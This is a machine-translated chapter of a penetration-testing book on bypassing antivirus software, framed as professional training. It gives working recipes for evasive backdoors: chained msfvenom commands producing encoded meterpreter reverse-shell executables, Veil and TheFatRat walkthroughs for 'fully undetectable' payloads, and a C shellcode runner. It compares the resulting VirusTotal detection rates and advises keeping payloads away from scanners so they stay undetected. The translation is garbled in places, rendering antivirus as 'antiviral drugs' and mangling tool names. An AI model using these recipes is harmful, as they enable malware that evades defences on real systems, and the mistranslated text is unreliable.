# 十一、防病毒绕过

拥有防病毒软件的概念并不新鲜。它是一种常见的安全控制，用于保护用户免受恶意软件和其他类型恶意软件的攻击。从历史上看，它一直专注于预防病毒感染。在您的渗透测试项目中，找到一个没有防病毒软件的客户是极其罕见的，甚至几乎是不可能的。

在本章中，您将了解防病毒技术的演变以及它们如何变得更加复杂。您将了解可用于防病毒绕过的各种技术，还将了解可帮助您利用这些技术的工具。您将学习如何对有效负载进行编码以避免检测，最后，探索可用于检查有效负载检测率的在线工具。

随着本章的学习，您将了解以下主题：

*   防病毒技术的发展
*   防病毒绕过的概念
*   防病毒绕过入门
*   测试绕过技术

# 技术要求

要遵循本章中的示例和说明，请检查您是否具备以下技术要求：

*   Kali Linux 2019.1

# 防病毒技术的发展

威胁形势正在迅速演变。在过去几年中，出现了一些攻击载体，如自动攻击、无文件恶意软件、基于固件的恶意软件、**高级持久性威胁**（**APT**）恶意软件以及复杂的勒索软件。攻击者可以利用人工智能和机器学习进行攻击。基于这些攻击的进展，抗病毒药物必须迎头赶上。

# 和老人出去

传统的防病毒软件仅仅是为了阻止基于特征码的病毒，并根据模式查找文件系统或应用中的变化，现在已经不够了。尽管今天仍然使用签名和基于模式的匹配，但仍然存在一些弱点。例如，无法更新签名，或者无法跟上每天发布的大量恶意软件，都会带来巨大的风险。启发式扫描是防病毒软件根据一组变量分析代码的能力，这些变量将指示病毒是否存在。这种方法可以检测额外的一组病毒，但也可以绕过，因为变量可以修改。杀毒软件的扫描和拦截功能有其优点，但这些也可以绕过。

现有的恶意软件增长过快，防毒软件制造商无法跟上。

# 与新事物相适应

今天的抗病毒应用已经发展到能够检测和防止隐藏的漏洞利用、利用威胁情报、全面了解端点（包括应用、进程和内存）、警报自动化、取证功能和数据收集。

当今时代的抗病毒药物可称为下一代抗病毒药物，并使用以下策略：

*   查看阻止使用典型方法绕过正常流程操作的流程的漏洞利用技术。此方法不考虑文件类型，但不考虑进程本身。
*   机器学习技术，可用于学习特定恶意文件的数百种变体；在旧的防病毒软件中，这项任务需要一些人工交互和沙箱环境来测试每个变体。

*   比磁盘更远的检测功能。诸如无文件恶意软件之类的恶意软件不会在磁盘上丢弃任何内容。传统的防病毒软件无法检测到这一点，但下一代的防病毒软件可以。
*   人工智能的作用是通过使防病毒识别模式进一步减少人为干预，将其与威胁联系起来，并用新模式更新自己的数据库。

这些下一代抗病毒药物似乎使我们无法逃避，但这仍然是可能的。随着其防御能力的提高，我们可以利用的进攻工具也在提高。

# 防病毒绕过的概念

在渗透测试的开发阶段，您将需要获得在目标系统上运行的代码。这可以通过网络钓鱼电子邮件、利用漏洞或社会工程来实现。您将拥有的拦截器是防病毒软件（无论是传统版本还是下一代版本）。绕过防病毒最有效的方法是创建自己的自定义负载。在我们开始创建有效负载之前，让我们考虑几个提示：

*   侦察在防病毒绕过中起着重要作用。知道你的目标是什么是关键。如果你觉得你想有一个定制的负载，避免所有的防病毒产品，你是误导自己。实现这一目标所花费的时间太长，而且每个供应商都在积极改进他们的产品，因此您的有效负载将很快被检测到。将有效负载缩小到目标的防病毒软件。
*   一旦您有了一个工作的外壳代码，您可以在以后的渗透测试中再次重用它，并且它仍然可以工作。为确保降低利用漏洞的检测能力，切勿将其提交给 VirusTotal（本章稍后将介绍）或任何其他在线扫描仪等服务。这些在线资源通常会将样本提交给防病毒供应商，这些供应商反过来会使用这些样本来增强其检测能力。
*   简单是关键。不要追求拥有大量功能的迷人有效载荷。请记住，您只是尝试禁用防病毒，然后使用更强大的工具。
*   使用您可用的资源。例如，Metasploit 具有可用于防病毒绕过的模块。在线资源（如开发数据库）具有可下载、自定义和使用的外壳代码。

记住这些窍门将有助于你在渗透测试工作中取得进展，因为在规划反病毒绕过计划时，你有一个很好的出发点。

# 防病毒绕过技术

现在我们已经确定了防病毒绕过的必要性，让我们看看现有的各种技术。以下是可以使用的最常用的技术。

# 编码器

编码器允许您避免利用漏洞中的字符导致其故障。通过使用 MSFvenom，您可以访问许多编码器。编码的工作原理是分解有效负载并添加额外的代码来屏蔽真实的有效负载。有一些解码指令被添加到有效负载中，以便在其运行之前对其进行解码。MSFvenom 有一些内置编码器，我们将在本章后面介绍。

# 自定义编译

使用 MSFvenom 的内置编码器并不像我们希望的那样高效。Metasploit 及其组件一直是防病毒制造商关注的焦点，他们密切关注其中编码器的改进。为了避免这种情况，您可以利用自定义编译来创建无法检测的负载。看看 C 编程语言，您可以利用一些关键组件向代码中添加随机性，以诱使防病毒程序无法检测到它。

# 混淆

模糊处理是修改有效负载的过程，这样杀毒软件就不清楚它，但它仍然可以用于预期目的。混淆有效负载的一种方法是使用加密。使用**高级加密标准**（**AES**，可以使用 Hyperion（我们稍后将介绍）等工具对有效负载进行加密。一旦有效负载运行，就会进行解密，并且有效负载能够执行。这种加密有助于降低病毒使用的检测率。

当然，由于抗病毒药物的使用越来越好，仅仅使用一种逃避方法是不可能的。没有用于防病毒绕过的**银弹**。您将需要结合一些技术来帮助降低有效负载的检测率。

# 防病毒绕过入门

进行渗透测试时，您和客户之间存在一定程度的信任。当您将任何有效负载放到他们的环境中时，例如绕过防病毒以创建系统后门，您需要确保有效负载仅连接回您。代码中不应该有任何可能导致客户机环境真正受损的 bug。

在使用本节中定义的各种工具时，请确保明确定义了目标将连接回的系统 IP。这样做将确保你在职业生涯的最初学习阶段强化信任的概念。

# MSFvenom

MSFvenom 是一个命令行工具，是 Metasploit 框架的一部分。它用于生成可用于向系统提供后门的各种外壳代码。

MSFvenom 中的一些常见开关如下所示：

| `-l` | 这用于显示每个类别（编码器、有效载荷、格式、加密机等）中所有模块的列表。例如，使用`msfvenom -l payloads`将显示当前可用的有效载荷集。 |
| `-p` | 这定义了将要使用的有效负载。例如，使用`msfvenom -p windows/x64/meterpreter_reverse_https`命令将定义 MeterMeter 反向 HTTPS 有效负载。 |
| `-f` | 这定义了输出格式。例如，您可能想要创建一个`.exe`或`.c`文件。 |
| `-b` | 这用于消除坏字符。抗病毒药物会寻找像`\x00`这样的坏字符。 |
| `-e` | 这用于定义将要使用的编码器。例如，常用的编码器之一是`/x86/shikata_ga_nai`。 |
| `-i` | 这用于定义外壳代码编码的最大次数。 |
| `-a` | 这用于定义体系结构。例如，`-a x64`将创建一个 64 位外壳代码。 |
| `--platform` | 这用于定义外壳代码将针对的平台。例如，`--platform Windows`用于 Windows 操作系统。 |

MSFvenom 有更多的选项和开关；上表描述了创建有效负载时通常使用的方法。

MSFvenom 允许将多个命令链接在一起。这是在每个命令结束时使用`| \`序列完成的。

要使用一系列命令创建有效负载，请执行以下步骤。注意每个命令末尾的`| \`序列。

在终端窗口中，输入以下命令：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.34.153 LPORT=8080 -f raw -e x86/shikata_ga_nai -i 15  | \
msfvenom -a x86 --platform windows -e x86/countdown -i 9  -f raw | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o MSFV-payload.exe

```

完成输入上述命令后，应获得以下输出：

![](assets/6371948d-f93c-4879-b68a-e4bbf90c0ffd.png)

图 1：链接的 MSFvenom 命令

在命令的第一行中，我们定义要使用的`meterpreter/reverse_tcp`有效载荷。然后定义攻击主机的 IP（`LHOST`和端口（`LPORT`。然后我们使用原始格式（`-f`），并使用`shikata_ga_nai`编码器（`-e`）进行 15 次迭代（`-i 15`。

在命令的第二行中，我们通过定义架构（`-a`）、平台（本例中为 Windows（`--platform`）以及迭代 9 次的`x86/countdown`编码器，进一步对原始文件进行编码。

最后，我们通过再次运行`shikata_ga_nai`编码器并使用`-f exe -o`选项创建一个`exe`文件来编译它。

一旦命令执行，它将创建一个名为`MSFV-payload.exe`的后门文件，该文件存储在`/root/Downloads/`文件夹中。

我们将在本章后面的*测试绕过技术*部分测试该文件的检测率。

# 逃避面纱

“面纱绕过”工具集可用于创建外壳代码，以绕过常见的使用，并生成反向外壳。

可以按照以下步骤安装工具套件：

1.  在 Kali Linux 中打开终端窗口。
2.  使用`apt install -y veil`命令。这将下载工具套件、所有依赖项，并为安装做好准备。当我们被询问是否要安装软件时，`-y`命令用于简单地预定义`yes`参数。

3.  下载完所有内容后，您可以通过运行`veil`**命令启动安装（请参见下面的屏幕截图）。使用`s`**选项进行静默安装。这仍将向您显示正在安装的组件，但不需要您进行交互：****

 ****![](assets/08de093e-1133-458c-8311-059b417ff79f.png)

图 2：安装面纱组件

Veil 安装完成后，您可以从终端窗口使用`veil`命令运行该工具。在第一次启动时，您将看到主窗口（参见下面的屏幕截图），其中将显示已加载的两个工具。使用`use [number]`命令完成特定工具的使用；例如，要使用`Evasion`，您可以使用`use 1`命令：

![](assets/70b7e294-9cf5-4dda-8881-ac36eb613fc9.png)

图 3：初始菜单

我们现有的工具有`Evasion`和`Ordnance`。这两种工具执行不同的功能，如下所示：

*   `Evasion`：此**用于生成可用于绕过防病毒的有效负载。**
***   `Ordnance`：用于生成可与`Evasion`一起使用的外壳代码。`Ordnance`无需使用 MSFvenom 生成外壳代码。原因是，随着 MSFvenom 的更新，它将破坏`Evasion`创建的有效负载。**

 **让我们使用 Veil 创建恶意负载：

1.  使用`veil`命令启动`Veil`。
2.  一旦`Veil`启动，我们将使用`Evasion`工具。输入`use 1`*：*

![](assets/727626f6-02a6-4656-b1d7-a9df8f0fd8d5.png)

图 4：选择绕过工具

3.  要查看有效载荷的完整列表，请输入`list payloads`命令。在撰写本文时，Veil Eversion 中有 41 个有效载荷可用。我们将使用`python/shellcode_inject/aes_encrypt.py`*创建有效负载。要选择此有效负载，我们将使用与其关联的编号。*

 *4.  要使用有效载荷，我们将发出`use 29`命令：

![](assets/23932785-5731-4520-9af1-986c3327a0ba.png)

图 5：选择有效负载

5.  在有效负载中，我们有许多可配置的选项。如果您想要配置这些，我们可以使用`set [option name] [value]`命令进行配置。例如，要配置`CLICKTRACK`选项，您将使用`set CLICKTRACK 1`命令。我们现在不会配置任何选项，因此我们将键入`generate`继续下一步。

6.  现在我们有了与外壳代码相关的选项（请参见下面的屏幕截图）。在这里，您会注意到我们可以利用`MSFVenom`、`Ordnance`、`Custom shellcode strings`等等。我们将使用`Ordnance`创建外壳代码。输入选择编号`1`：

![](assets/c9a4e95a-3fac-47d8-b85f-bc67d2ba15df.png)

图 6：外壳代码选择

7.  当您输入选项`1`时，您将进入`Veil-Ordnance`菜单（见以下屏幕截图）。在这里，您有几个选项，例如查看`payloads`和`encoders`。要查看有效载荷，请输入`list payloads`**命令：**

 **![](assets/47dfbafd-4a98-49ee-830c-1a6d2f01b14a.png)

图 7：军械有效载荷

8.  我们将通过使用`use 3`命令来选择`rev_https`有效载荷。现在我们看到了有效载荷的选项。

9.  我们需要在这里定义一些选项。定义`LHOST`和`LPORT`变量。请记住，这是目标计算机将连接回的 IP 地址和端口。我还定义了使用内置`xor`命令的`Encoder`。您可以使用`set`命令定义这些设置。除了`LHOST`IP 地址外，您的输出应类似于以下内容：

![](assets/3ff3e746-e355-4e35-9528-612f332652b7.png)

图 8：定义有效负载选项

10.  键入`generate`生成外壳代码。现在您将看到外壳代码的输出，Veil 将要求您输入文件名（请参见下面的屏幕截图）*。*给它一个名字，然后按*进入*：

![](assets/0066bdbf-42cc-43f3-b926-6aad1191e2e4.png)

图 9：生成的外壳代码

11.  一旦为输出文件提供了基本名称，就可以选择一个选项来创建有效负载可执行文件。对于本演示，我们将使用默认值`PyInstaller`。

12.  一旦流程完成，您将显示恶意可执行文件和源代码的位置*：*

![](assets/19878fa6-b381-4360-8811-7dbdfb9f92ff.png)

图 10：创建的恶意可执行文件

通过在目标机器上运行此可执行文件，它将为您用作攻击者的机器创建后门反向 shell。当然，我们仍然需要确定此可执行文件是否会被任何用户检测到。我们将在本章的*测试绕过技术*部分进行测试。

# 西阿特拉特

ATRAT 是另一种可用于生成无法检测的有效载荷的工具。它支持 Windows、Android 和 macOS 的有效负载。它有很多选择，例如：

*   自动化 Metasploit 功能（创建后门、防病毒绕过、启动 MeterMeter 侦听等）
*   基于 Android APK 创建后门
*   文件泵（用于增加文件大小）
*   使用 office 文件创建后门

默认情况下，Kali Linux 不包括 ATRAT。可以使用以下步骤安装它：

1.  在 Kali Linux 中打开终端窗口，并使用以下命令克隆`TheFatRat`的存储库：

```
git clone https://github.com/Screetsec/TheFatRat.git
```

2.  克隆存储库后，使用以下命令导航到该目录：

```
cd TheFatRat
```

3.  更改文件权限并使用以下命令运行安装脚本：

```
chmod +x setup.sh && ./setup.sh.
```

在这个命令中，我们正在更改`setup.sh`文件的权限，以便可以运行它。

4.  在安装过程中，将安装所有依赖项。

安装完成后，可以使用`fatrat`命令运行 ATRAT。

在启动过程中，ATRAT 提供了一个关于不将生成的有效负载上载到 VirusTotal 的警告。我们将在本章后面的*测试绕过技术*一节中对此进行讨论。

让我们使用`TheFatRat`创建一个有效负载：

1.  从终端窗口，使用`fatrat`命令启动`TheFatRat`。
2.  加载菜单后，您会注意到可以使用以下几个选项：

![](assets/afe68a7d-c555-4d9f-ad72-5cce6fa78fea.png)

图 11:TheAtrat 主菜单

3.  选择选项`2`创建一个带有`Fudwin`的`Fud`。

`Fud` is an abbreviation of **Fully Undetectable Payload**.

4.  `Fudwin`模块加载后，我们有两个选项。我们将选择选项`2`–`Slow but Powerfull`。此工具编译具有 MeterMeter 反向 TCP 负载的 C 程序：

![](assets/136c4a48-c207-442e-a382-50b22740a19c.png)

图 12：使用 Fudwin 模块选择工具

5.  选择选项`2`后，需要定义`LHOST`和`LPORT`选项。接下来，您需要选择目标操作系统的体系结构。这可以是`x86`或`x64`。
6.  一旦定义了选项，该工具将处理其余的部分。它会将恶意负载编译成可执行文件，该文件将存储在`output`目录下的`TheFatRat`根文件夹中。

一旦文件在远程系统上运行，它将为攻击机器创建一个反向`tcp`后门。在*测试绕过技术*部分，我们将比较此有效载荷的检测率与我们创建的其他有效载荷的检测率。

# 自定义编译

自定义编译有助于大幅降低检测能力。您可以利用 internet 上提供的自定义外壳代码，并根据需要调整它们以执行所需的功能。

在本节中，我们将介绍在基本级别创建自定义外壳代码。外壳代码的创建可能会变得复杂，并且随着渗透测试职业的发展，您将提高编写复杂外壳代码的技能。我们将介绍 C 编程语言中外壳代码的创建。

诸如 Exploit DB 之类的网站拥有大量由社区发布的外壳代码。可通过以下 URL 访问：[https://www.exploit-db.com/shellcodes](https://www.exploit-db.com/shellcodes) 。

让我们使用 C 创建一个自定义外壳代码

首先，我们将使用 MSFvenom 创建一个外壳代码文件。让我们使用前面创建的相同外壳代码，但这次，我们将把它输出到一个`.C`文件：

1.  在终端窗口中，使用`mkdir msfv-shellcode`命令创建一个新目录。
2.  使用`cd msfv-shellcode`命令导航到目录。
3.  现在，使用以下链接的命令创建有效负载：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.34.153 LPORT=8080 -f raw -e x86/shikata_ga_nai -i 15  | \
msfvenom -a x86 --platform windows -e x86/countdown -i 9  -f raw | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f c -o MSFV-shellcode.c
```

执行上述命令后，MSFvenom 将创建外壳代码文件。

现在，我们需要添加一些变量，这样我们就可以使用 C 编程语言来编译它。编辑刚刚使用文本编辑器或 nano 创建的`MSFV-shellcode.c`文件。

添加以下以粗体标记的行：

```
#include<stdio.h>
#include<string.h>

unsigned char buf[] = 
"\xbd\xa1\xe2\xe6\x8b\xd9\xeb\xd9\x74\x24\xf4\x5f\x2b\xc9\x66"
"\xb9\x1b\x01\x83\xef\xfc\x31\x6f\x12\x03\x6f\x12\x43\x17\x5c"
"\x54\x5a\x66\x22\xb1\x95\x4e\x51\x62\xd1\x2e\xa9\xa3\x7f\x68"
"\xd9\x32\xfc\x65\x1e\x05\x55\x6b\xdc\x31\x97\xb0\xa9\x85\xdb"
--snip--

int main ()
{
 printf("Shellcode Length: %d\n", strlen(buf));
 int (*ret)() = (int(*)())buf;

 ret();
}
```

在前面的代码中，我剪切了外壳代码，以便所需的代码行可见。在外壳代码文件中，`unsigned char buf [] =`行下面将有更多字符。

在前面的代码中，我们添加了以下组件：

| `#include<stdio.h>` | 这里，我们调用一个引用输入和输出函数的库。 |
| `#include<string.h>` | 在这里，我们调用一个库来处理字符串，因为我们使用`strlen`函数来计算字符串长度 |
| `int main` | 此字符串用于声明函数。在 C 编程语言中，`main`下的函数是程序加载时运行的函数。 |
| `printf("Shellcode Length: %d\n` | 此行用于发送打印输出并屏蔽外壳代码长度。 |
| `int (*ret)() = (int(*)())buf;`

`ret ()` | `int (*ret)()`用于声明指针，`=(int(*)())buf;`是将要使用的指针。`ret()`正在调用该指针，该指针随后指向运行的外壳代码。 |

一旦您添加了额外的代码，我们现在可以将其编译成一个可执行文件（参见下面的屏幕截图）。这是使用`mingw32`编译器完成的，该编译器在您安装 Veil 框架时已经安装。如果未安装，可以使用以下命令进行安装：

```
apt install mingw-w64
```

要将外壳代码编译为可执行文件，请使用以下命令：

```
x86_64-w64-mingw32-gcc MSFV-shellcode.c -o MSFV-shellcode.exe 
```

我们得到以下输出：

![](assets/75202425-ab4d-48e8-9d87-660c5000de56.png)

图 13：将外壳代码编译成可执行文件

现在，您有了一个可执行文件，它将创建一个反向 shell。使用自定义编译过程，可以显著降低抗病毒药物使用的检测率。通过添加额外的随机字符，可以进一步模糊检测率。

# 测试绕过技术

测试有效负载可以通过两种方式完成。一种方法是在实验室环境中使用目标系统的副本对其进行测试；但是，这并不总是可能的，因为您的客户端正在使用的防病毒程序可能有许可要求。

您拥有的另一个选项是将有效负载的样本提交给 VirusTotal 等在线服务。

# 病毒总数

VirusTotal 被安全行业的许多人用来提交文件或 URL 进行恶意软件分析。VirusTotal 通过与 70 多家防病毒供应商交叉检查提交内容来工作。VirusTotal 有一个缺点，即提交内容与防病毒供应商共享，以帮助提高其检测能力。

当您构建自己的负载时，您不会希望与防病毒制造商共享此负载。如果它是共享的，那么有效负载工作的机会将显著降低，因为一旦防病毒制造商使用提交信号更新其检测能力，检测率将提高。

VirusTotal 可通过以下 URL 访问：[https://www.virustotal.com/](https://www.virustotal.com/) 。

让我们看一下在上一节中创建的有效载荷，以及它们的检测率。

**MSFvenom**的检测率为 50/71，尽管我们使用了两个多次迭代的编码器：

![](assets/37d73c2e-6147-47ad-ad77-9edb03c4ddbc.png)

图 14:MSFvenom 生成的外壳代码的检测率

测试我们使用相同的 MSFvenom 有效负载创建的自定义外壳代码会产生显著较低的检测率（70 分之 8）：

![](assets/6297be12-3fb6-4bac-b1d4-ad7b1c398010.png)

图 15：自定义 shell 代码检测率。

**面纱**在 70*中的检出率为 35%。*这远低于使用 MSFvenom 生成的值：

![](assets/eb16fe0b-1e86-4d8d-92a9-ee7bd40fff7f.png)

图 16:Veil 生成外壳代码的检测率

Theatrat 的检出率为 70 分之 6*。*这远远低于 MSFvenom 和 Veil。注意文件名是`Powerfull-fud.exe`；ATRAT 将生成一个正常的`Powerfull.exe`文件，该文件也可以使用。其中一人的检出率为 70 分之 8：

![](assets/70a5cb1e-eae7-4f00-9d99-ec37fbc038a9.png)

图 17:TheFatRat 生成外壳代码的检测率

我们可以在这里看到，不同的技术产生不同的结果。随着抗病毒药物的发展，产生完全无法检测的有效载荷变得更加困难。但是，了解如何使用可用的工具将有助于您构建适合您的目标的有效负载，并且其防病毒软件无法检测到。

# 总结

在本章中，您了解了抗病毒药物的演变，以及他们现在如何开始利用机器学习和人工智能。您已经了解了可用于绕过抗病毒药物使用的各种技术，以及可用于创建无法检测的有效载荷的各种工具。我们使用外壳代码创建了一些有效负载，并使用 VirusTotal 等在线服务查看了它们的检测率。

在下一章（[第 12 章](12.html)、*在环境中维护控制*）中，我们将讨论持久性以及如何在受损网络中维护访问。

# 问题

1.  抗病毒药物是如何进化的？
2.  列举两种防病毒绕过技术。
3.  可以利用哪些工具来构建不可检测的有效负载？
4.  使用自定义编译的外壳代码有什么好处？
5.  一旦你建立了有效载荷，你就不应该做什么？*********